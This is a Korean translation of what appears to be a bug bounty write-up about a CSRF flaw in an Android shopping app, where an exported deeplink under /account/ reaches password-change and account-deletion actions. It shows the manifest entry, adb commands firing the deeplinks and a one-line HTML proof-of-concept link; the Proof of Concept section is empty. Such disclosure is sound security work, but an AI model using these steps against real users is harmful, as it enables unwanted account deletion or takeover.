---
title: "CSRF로 인해 계정이 삭제될 수 있습니다"
description: ""
coverImage: "/assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png"
date: 2024-05-23 14:47
ogImage: 
  url: /assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png
tag: Tech
originalTitle: "CSRF Leads to Delete Account"
link: "https://medium.com/@happyjester80/csrf-leads-to-delete-account-241f2cf8950b"
---


# 안녕하세요!

![이미지](/assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png)

# 소개

- 대상: 안드로이드 애플리케이션
- 날짜: 2024년 5월
- 요약: Corp 앱에서 CSRF 취약점을 발견했습니다. 이 취약점을 이용하여 사용자 계정을 삭제할 수 있는 Deeplink와 delete-account 엔드포인트 간의 상호작용이 가능합니다.

<div class="content-ad"></div>

# 복제 단계

- 먼저 AndroidMainfast.xml을 살펴봅니다.

```xml
        <activity android:theme="@style/Theme.Thredup.Splash" android:name="com.example.android.feature.splash.SplashActivity" android:exported="true" android:launchMode="singleTask" android:screenOrientation="behind" android:configChanges="screenSize|orientation" android:noHistory="true">
            <intent-filter android:autoVerify="true">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="www.example.com" android:pathPrefix="/account"/>
                <data android:scheme="https"/>
                <data android:scheme="http"/>
            </intent-filter>
        </activity>
```

- 'adb'를 사용하여 호출한 후에 /account/라는 Path로 이 Deeplink를 발견했습니다.

<div class="content-ad"></div>

- 지금은 설정에 있어요;
- 잠시만 android:pathPrefix=/account/는 무슨 의미일까요?
- android:pathPrefix 속성은 Intent 객체의 경로의 초기 부분에만 일치하는 부분 경로를 지정합니다. 그래서 아마도 /account/ 뒤에 무언가를 찾을 수 있을지도 모릅니다.
- 설정 이후에 API 호출을 가로챈 후, 비밀번호 변경이나 계정 삭제와 같은 설정 후의 API 엔드포인트를 Deeplink에서 사용해 봅시다.

```js
adb shell am start -a android.intent.action.VIEW -n com.thredup.android/com.thredup.android.feature.splash.SplashActivity -d "https://www.example.com/account/change_password"

adb shell am start -a android.intent.action.VIEW -n com.thredup.android/com.thredup.android.feature.splash.SplashActivity -d "https://www.example.com/account/delete_password"
```

- 지금 CSRF로 만들어 봐요.

<div class="content-ad"></div>

```javascript
<!DOCTYPE html>
<html>
<a href="https://www.example.com/account/change_password">CSRF DEMO</a>
</html>
```

# Proof of Concept